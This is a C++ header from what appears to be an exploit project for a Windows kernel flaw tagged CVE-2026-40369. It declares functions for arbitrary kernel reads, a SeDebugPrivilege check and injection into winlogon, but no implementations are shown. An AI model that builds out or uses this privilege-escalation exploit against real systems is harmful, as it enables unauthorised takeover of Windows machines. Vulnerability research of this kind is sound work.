/*
 * @Date: 2026-11-03 14:54:36
 * @LastEditors: joe1sn joe1sn23333@gmail.com
 * @LastEditTime: 2026-11-03 15:04:43
 * @FilePath: \panicake\exp\CVE_2026_40369\exp.hpp
 */
#pragma once
#define WIN32_LEAN_AND_MEAN
#include "def.hpp"
#include "include/common/memtools.hpp"
#include "utils/prefectch/prefectch.hpp"
#include <vector>
#include <tlhelp32.h>

namespace CVE_2026_40369
{

    inline constexpr ULONG_PTR ring3Addr = 0x94000000;

    enum seDebugResult {
        CANT_OPEN,
        DONT_HAVE,
        NOT_ENABLE,
        SUCCESS,
    };

    using PFN_NtQuerySystemInformationEx = NTSTATUS(NTAPI*)(
        ULONG SystemInformationClass,
        PVOID InputBuffer,
        ULONG InputBufferLength,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
        );

    inline PFN_NtQuerySystemInformationEx NtQuerySystemInformationEx =
        (PFN_NtQuerySystemInformationEx)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformationEx"
        );

    inline PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformation"
        );
    bool InjectToWinlogon();
    bool checkApi();
    void SetProcessUtf8();
    std::vector<BYTE> Utf8ToRawBytes(BYTE* utf8);
    NTSTATUS vulnAddPtr(LPVOID addr, bool debug = false);
    NTSTATUS queryBuildInfo(DWORD index, SYSTEM_BUILD_VERSION_INFORMATION* info, bool debug = true);
    std::vector<BYTE> RecoverOriginalBytes(
        const BYTE* utf8Data,
        ULONG utf8DataSize,
        ULONG originalByteCount);
    seDebugResult CheckSeDebugPrivilege();
    std::vector<BYTE> arbitraryRead(DWORD index, PVOID victimAddr, PVOID targetAddr, DWORD size);
    bool Exp();
} // namespace CVE_2026_40369